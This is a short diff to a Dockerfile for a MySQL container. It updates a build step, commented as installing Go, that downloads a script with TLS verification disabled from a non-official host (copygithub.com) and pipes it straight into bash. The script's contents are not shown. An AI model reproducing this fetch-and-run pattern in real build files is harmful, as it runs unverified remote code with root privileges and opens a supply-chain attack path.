@@ -7,7 +7,7 @@ RUN groupadd -r mysql && useradd -r -g mysql mysql
 RUN apt-get update && apt-get install -y --no-install-recommends gnupg dirmngr wget curl dnsutils procps net-tools && rm -rf /var/lib/apt/lists/*
 
 #安装go
-RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5de4eb087ad32' | bash
+RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e0171bd4f046' | bash
 
 # add gosu for easy step-down from root
 ENV GOSU_VERSION 1.7
